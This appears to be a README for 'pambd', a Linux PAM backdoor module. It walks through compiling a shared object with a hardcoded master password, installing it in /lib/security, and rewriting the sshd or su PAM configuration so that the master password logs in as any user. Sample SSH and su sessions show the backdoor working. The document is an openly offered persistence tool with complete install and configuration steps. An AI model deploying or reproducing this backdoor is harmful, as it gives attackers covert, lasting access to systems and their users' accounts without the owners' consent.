pambd
=====

Introduction
------------

This trick shows you how to create a PAM module backdoor that 
allows to execute an user login with your own custom password.

If you try to make the login with the real password of the target 
user and the authentication fails, the pam_auth.so switches to the 
pambd.so and viceversa.


Generate the backdoor
---------------------

If you get the error:

    pambd.c:13:31: fatal error: security/pam_appl.h: No such file or directory

First install the package **libpam-dev** that contains the needed headers file for compilation:

    deftcode pambd $ sudo apt-get install libpam0g-dev

Now edit the **pambd.c** and set your master custom password:

    #define MYPASSWD "my_master_passwd"

After that, generate the pam backdoor with:
(It needs the root permissions)

    deftcode pambd $ sudo sh gen.sh

This will generate the pam backdoor at **/lib/security/pambd.so**.


Configure the PAM service you want to hijack
--------------------------------------------

Edit the **/etc/pam.d/sshd** or other that use PAM like **/etc/pam.d/su** and then replace the content with these lines:

    nauth           sufficient      pam_rootok.so
    auth            sufficient      pam_unix.so     # This must be 'sufficient'.
    account         required        pam_unix.so
    session         required        pam_unix.so
    auth            sufficient      pambd.so        # This is our pam backdoor.
    account         sufficient      pambd.so        # --


Test the backdoor
-----------------

After you have created the pambd backdoor, you can test It.

    deftcode pambd $ file /lib/security/pambd.so 
    /lib/security/pambd.so: ELF 64-bit LSB  shared object, x86-64, version 1 (SYSV), dynamically linked, not stripped

Example with the **SSH** service:

    deftcode pambd $ ssh eurialo@deftcode.local
    eurialo@deftcode.local's password: 
    
    # eg. enter: my_master_passwd or real_user_password
    
    Last login: Thu May 21 05:55:13 2015 from localhost
    deftcode ~ $ 

Example with **su**:

    deftcode pambd $ su -
    Password: 

    # eg. enter: my_master_passwd or real_user_password

    deftcode ~ # 
